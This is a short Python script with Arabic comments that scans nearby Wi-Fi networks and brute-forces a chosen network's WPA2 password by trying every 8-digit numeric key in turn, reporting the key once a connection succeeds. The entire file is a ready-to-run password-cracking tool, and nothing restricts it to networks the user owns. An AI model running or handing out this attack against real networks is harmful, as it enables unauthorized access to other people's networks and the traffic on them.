import pywifi
from pywifi import PyWiFi, const, Profile
import time

def scan_wifi():
    try:
        wifi = PyWiFi()
        interfaces = wifi.interfaces()

        if len(interfaces) == 0:
            print("No Wi-Fi interfaces found.")
            return None

        inf = interfaces[0]  # الحصول على أول واجهة WiFi متاحة
        inf.scan()
        time.sleep(2)  # الانتظار لإعطاء الوقت للمسح
        scan_results = inf.scan_results()
        
        if len(scan_results) == 0:
            print("No networks found.")
            return None
        
        print("Available networks:")
        for idx, network in enumerate(scan_results):
            print(f"{idx}. {network.ssid}")
        
        return inf, scan_results
    except Exception as e:
        print("No INF X: ", e)
        return None, None

def connect_to_wifi(inf, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    inf.remove_all_network_profiles()
    temp_prof = inf.add_network_profile(profile)
    
    time.sleep(0.05)  # تقليل وقت الانتظار بعد إعداد البروفايل
    inf.connect(temp_prof)
    
    time.sleep(0.1)  # تقليل الانتظار لمحاولة الاتصال

    if inf.status() == const.IFACE_CONNECTED:
        print(f"Password is correct: {password}")
        return True
    else:
        inf.disconnect()  # قطع الاتصال إذا كان غير صحيح
        time.sleep(0.05)  # تقليل وقت الانتظار للتأكد من الانفصال
        return False

def run_password_attempts(inf, ssid):
    for num in range(100000000):  # الأرقام من 00000000 إلى 99999999
        password = f"{num:08d}"  # تحويل الرقم إلى سلسلة مكونة من 8 أرقام
        print(f"Trying password: {password}")  # عرض المحاولة الحالية
        if connect_to_wifi(inf, ssid, password):
            print(f"Password found: {password}")
            break

if __name__ == "__main__":
    interface, networks = scan_wifi()

    if interface and networks:
        # السماح للمستخدم باختيار الشبكة
        choice = int(input("Enter the number of the network you want to connect to: "))
        
        if choice < 0 or choice >= len(networks):
            print("Invalid choice.")
        else:
            ssid = networks[choice].ssid  # اسم الشبكة (SSID)
            print(f"Selected network: {ssid}")
            run_password_attempts(interface, ssid)
